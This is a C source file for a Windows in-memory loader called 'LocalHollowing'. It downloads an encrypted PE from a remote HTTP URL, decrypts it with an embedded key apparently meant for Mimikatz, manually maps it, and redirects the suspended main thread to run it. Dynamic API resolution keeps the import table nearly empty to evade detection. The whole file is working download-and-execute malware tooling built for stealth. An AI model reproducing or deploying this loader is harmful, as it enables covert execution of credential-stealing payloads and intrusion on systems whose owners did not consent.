/*
 * LocalHollowing - Remote payload download + dynamic API resolution
 * Payload is downloaded from HTTP server at runtime
 * Only GetModuleHandleA and GetProcAddress remain in the IAT
 */

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#include "mimi_key.h"
#include "resolve.h"

 // Global buffer for downloaded payload
unsigned char* PEBuff = NULL;
DWORD PEBuffSize = 0;
const char* g_payloadUrl = NULL;


/*
 * Function: DownloadPayload
 * Purpose: Downloads the encrypted PE from a remote HTTP server
 */
BOOL DownloadPayload(const char* url) {

    HINTERNET hInternet = p_InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("[-] Connexion echouee (%u)\n", GetLastError());
        return FALSE;
    }

    HINTERNET hUrl = p_InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        printf("[-] Acces impossible (%u)\n", GetLastError());
        p_InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Allocate buffer for the payload
    PEBuff = (unsigned char*)p_VirtualAlloc(NULL, PAYLOAD_SIZE + 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!PEBuff) {
        printf("[-] Memoire insuffisante (%u)\n", GetLastError());
        p_InternetCloseHandle(hUrl);
        p_InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Read the payload in chunks, never reading past PAYLOAD_SIZE
    DWORD totalRead = 0;
    DWORD bytesRead = 0;
    while (totalRead < PAYLOAD_SIZE) {
        DWORD remaining = PAYLOAD_SIZE - totalRead;
        DWORD toRead = remaining < 4096 ? remaining : 4096;
        if (!p_InternetReadFile(hUrl, PEBuff + totalRead, toRead, &bytesRead)) {
            printf("[-] Lecture interrompue (%u)\n", GetLastError());
            p_InternetCloseHandle(hUrl);
            p_InternetCloseHandle(hInternet);
            return FALSE;
        }
        if (bytesRead == 0) break;
        totalRead += bytesRead;
    }

    PEBuffSize = totalRead;
    printf("[+] Recu: %u octets\n", totalRead);

    p_InternetCloseHandle(hUrl);
    p_InternetCloseHandle(hInternet);

    return TRUE;
}


void RestoreIt(unsigned char* pedata, DWORD peLen, unsigned char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!p_CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return;
    }
    if (!p_CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return;
    }
    if (!p_CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        return;
    }
    if (!p_CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return;
    }
    if (!p_CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)pedata, &peLen)) {
        return;
    }

    p_CryptReleaseContext(hProv, 0);
    p_CryptDestroyHash(hHash);
    p_CryptDestroyKey(hKey);
}


BOOL ValidPE(const LPVOID lpImage)
{
    PIMAGE_DOS_HEADER lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    PIMAGE_NT_HEADERS lpImageNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
    if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
        return TRUE;
    return FALSE;
}


typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;


BOOL RunPE(HANDLE tHandle) {

    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)PEBuff;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(PEBuff)+DOSheader->e_lfanew);

    if (!NTheader) {
        printf(" [-] Format non reconnu\n");
        p_ResumeThread(tHandle);
        return FALSE;
    }

    BYTE* MemImage = (BYTE*)p_VirtualAlloc(NULL, NTheader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!MemImage) {
        printf(" [-] Allocation echouee (%u)\n", GetLastError());
        p_ResumeThread(tHandle);
        return FALSE;
    }

    memcpy(MemImage, PEBuff, NTheader->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER sectionHdr = IMAGE_FIRST_SECTION(NTheader);
    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)(MemImage)+sectionHdr[i].VirtualAddress, (BYTE*)(PEBuff)+sectionHdr[i].PointerToRawData, sectionHdr[i].SizeOfRawData);
    }

    IMAGE_DATA_DIRECTORY DirectoryReloc = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (DirectoryReloc.VirtualAddress == 0) {
        printf("Relocalisation impossible\n");
        p_ResumeThread(tHandle);
        return FALSE;
    }

    PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)(DirectoryReloc.VirtualAddress + (ULONG_PTR)MemImage);
    while (BaseReloc->VirtualAddress != 0) {
        DWORD page = BaseReloc->VirtualAddress;
        if (BaseReloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
        {
            size_t count = (BaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            BASE_RELOCATION_ENTRY* list = (BASE_RELOCATION_ENTRY*)(LPWORD)(BaseReloc + 1);
            for (size_t i = 0; i < count; i++) {
                if (list[i].Type & 0xA) {
                    DWORD rva = list[i].Offset + page;
                    PULONG_PTR p = (PULONG_PTR)((LPBYTE)MemImage + rva);
                    *p = ((*p) - NTheader->OptionalHeader.ImageBase) + (ULONG_PTR)MemImage;
                }
            }
        }
        BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)BaseReloc + BaseReloc->SizeOfBlock);
    }

    IMAGE_DATA_DIRECTORY DirectoryImports = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!DirectoryImports.VirtualAddress) {
        p_ResumeThread(tHandle);
        return FALSE;
    }

    PIMAGE_IMPORT_DESCRIPTOR ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(DirectoryImports.VirtualAddress + (ULONG_PTR)MemImage);
    while (ImportDescriptor->Name != NULL)
    {
        LPCSTR ModuleName = (LPCSTR)ImportDescriptor->Name + (ULONG_PTR)MemImage;
        HMODULE Module = p_LoadLibraryA(ModuleName);
        if (Module)
        {
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)MemImage + ImportDescriptor->FirstThunk);
            while (thunk->u1.AddressOfData != NULL)
            {
                ULONG_PTR FuncAddr = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    FuncAddr = (ULONG_PTR)p_GetProcAddress(Module, functionOrdinal);
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME FuncName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)MemImage + thunk->u1.AddressOfData);
                    FuncAddr = (ULONG_PTR)p_GetProcAddress(Module, FuncName->Name);
                }
                thunk->u1.Function = FuncAddr;
                ++thunk;
            }
        }
        ImportDescriptor++;
    }

    PIMAGE_SECTION_HEADER secHdr = IMAGE_FIRST_SECTION(NTheader);
    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        DWORD c = secHdr[i].Characteristics;
        DWORD prot = PAGE_NOACCESS;
        if (c & IMAGE_SCN_MEM_EXECUTE)
            prot = (c & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if (c & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;
        else if (c & IMAGE_SCN_MEM_READ)
            prot = PAGE_READONLY;
        DWORD oldProt;
        p_VirtualProtect((BYTE*)MemImage + secHdr[i].VirtualAddress, secHdr[i].Misc.VirtualSize, prot, &oldProt);
    }

    CONTEXT CTX = { 0 };
    CTX.ContextFlags = CONTEXT_FULL;

    BOOL bGetContext = p_GetThreadContext(tHandle, &CTX);
    if (!bGetContext) {
        printf("[-] Contexte inaccessible\n");
        p_ResumeThread(tHandle);
        return FALSE;
    }

    CTX.Rip = NTheader->OptionalHeader.AddressOfEntryPoint + (ULONG_PTR)MemImage;

    BOOL bSetContext = p_SetThreadContext(tHandle, &CTX);
    if (!bSetContext) {
        printf("[-] Mise a jour impossible\n");
        p_ResumeThread(tHandle);
        return FALSE;
    }

    printf("[+] Attente...\n");
    p_SleepEx(20000, FALSE);

    p_ResumeThread(tHandle);

    return TRUE;
}


void Doit(LPVOID p) {

    HANDLE mainThreadHandle = *(HANDLE*)p;

    p_SuspendThread(mainThreadHandle);
    printf("[+] Pret\n");

    if (!DownloadPayload(g_payloadUrl)) {
        printf("[-] Ressource introuvable\n");
        p_ResumeThread(mainThreadHandle);
        return;
    }

    printf("[+] Traitement...\n");
    RestoreIt(PEBuff, PEBuffSize, keyBuff, sizeof(keyBuff));

    if (!PEBuff) {
        printf("[-] Chargement echoue (%u)\n", GetLastError());
        p_ResumeThread(mainThreadHandle);
        return;
    }

    const BOOL bPE = ValidPE(PEBuff);
    if (!bPE)
    {
        printf("[-] Verification echouee\n");
        p_ResumeThread(mainThreadHandle);
        return;
    }

    printf("[+] Verification ok\n");
    printf("[+] Base: 0x%p\n", (LPVOID)(uintptr_t)PEBuff);

    if (!RunPE(mainThreadHandle)) {
        printf("[-] Erreur critique\n");
        p_ResumeThread(mainThreadHandle);
    }
}


int main(int argc, char** argv) {

    if (argc < 2) {
        printf("Usage: %s <url>\n", argv[0]);
        printf("Ex: %s http://192.168.1.10:8080/data.bin\n", argv[0]);
        return 1;
    }
    g_payloadUrl = argv[1];

    if (!ResolveAPIs()) {
        printf("[-] Initialisation echouee\n");
        return 1;
    }

    HANDLE pseudoHandle = p_GetCurrentThread();
    HANDLE realHandle;

    if (!p_DuplicateHandle(p_GetCurrentProcess(), pseudoHandle, p_GetCurrentProcess(), &realHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
        printf("[-] Acces refuse\n");
        return 1;
    }

    HANDLE thread = p_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Doit, &realHandle, 0, NULL);

    p_WaitForSingleObject(thread, INFINITE);

    p_CloseHandle(thread);
    p_CloseHandle(realHandle);

    return 0;
}
